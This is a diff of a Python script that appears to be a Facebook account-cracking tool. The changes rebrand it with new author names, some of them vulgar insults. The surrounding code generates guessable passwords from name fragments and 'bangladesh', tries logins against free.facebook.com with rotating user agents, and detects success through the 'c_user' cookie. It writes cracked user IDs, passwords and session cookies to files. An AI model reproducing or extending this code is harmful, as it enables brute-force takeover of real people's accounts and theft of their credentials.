@@ -1,4 +1,4 @@
-#credit mr mivi
+#credit Fuck Boy Alamvau
 import os
 try:
     import requests
@@ -111,10 +111,10 @@ logo = ("""\033[1;32m
                    \033[1;32m┃┃┃╰┳╯╰┫┃╱╱╱╱╱┃┃╱┃┃
                   \033[1;33m╰╯╰━┻━━┻╯╱╱╱╱╱╰╯╱╰╯                                             
 \x1b[38;5;46m_____________________________________________________
-\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : Md. Rifat Hasan Rear             
-\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : Md. Rifat Hasan Rear           
-\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mTOOL      : RANDOM CLONE  
-\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mTOOL VERSION :1.0 
+\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\33[1;92m AUTHOR    : MD. ALAM VAU               
+\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mFACEBOOK  : Md. Alamgir Hosen           
+\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mTOOL      : RANDOM CLONE HASIM CHODI
+\x1b[1;92m \x1b[1;97m[\x1b[1;92m•\x1b[1;97m] \33[1;92mTOOL VERSION :9.0 
 \x1b[38;5;46m_____________________________________________________""")
 os.system("clear")
 try:
@@ -217,8 +217,8 @@ def fuck():
             pwx = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
             yaari.submit(naim2,uid,pwx,tl)
     print(54*'━')
-    print(' [+] OK Ids saved in R1F4T/OK.txt')
-    print(' [+] CP Ids saved in R1F4T/CP.txt')
+    print(' [+] OK Ids saved in ALAMVAU/OK.txt')
+    print(' [+] CP Ids saved in ALAMVAU/CP.txt')
     print(54*'━')
     
 agents=[]
@@ -236,7 +236,7 @@ def naim2(uid,pwx,tl):
     try:
         for ps in pwx:
             session = requests.Session()
-            sys.stdout.write('\r [R1F4T]-[%s|%s]\33[1;92m[OK:%s]\r'%(loop,tl,len(oks))),
+            sys.stdout.write('\r [ALAMVAU]-[%s|%s]\33[1;92m[OK:%s]\r'%(loop,tl,len(oks))),
             sys.stdout.flush()
             pro = random.choice(ugen)
             m_fb = session.get('https://free.facebook.com/?tbua=1').text
@@ -275,7 +275,7 @@ def naim2(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
-                print(f'\r\33[1;97m [\33[1;92mR1F4T-OK\33[1;97m] \33[1;92m'+cid+' | '+ps+'\33[0;92m')
+                print(f'\r\33[1;97m [\33[1;92mALAMVAU-OK\33[1;97m] \33[1;92m'+cid+' | '+ps+'\33[0;92m')
                # print (f"\033[1;31m[\033[1;32m✓\033[1;31m]\033[1;32m COOKIES: {coki} ")
                 open('R1F4T-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(uid);cek_apk(coki)
@@ -284,7 +284,7 @@ def naim2(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
                 print('\33[1;91m[CHECKPOINT] '+uid+' | '+ps+'\33[0;97m')
-                open('R1F4T-CP.txt', 'a').write(cid+' | '+ps+'\n')
+                open('ALAMVAU-CP.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             else:
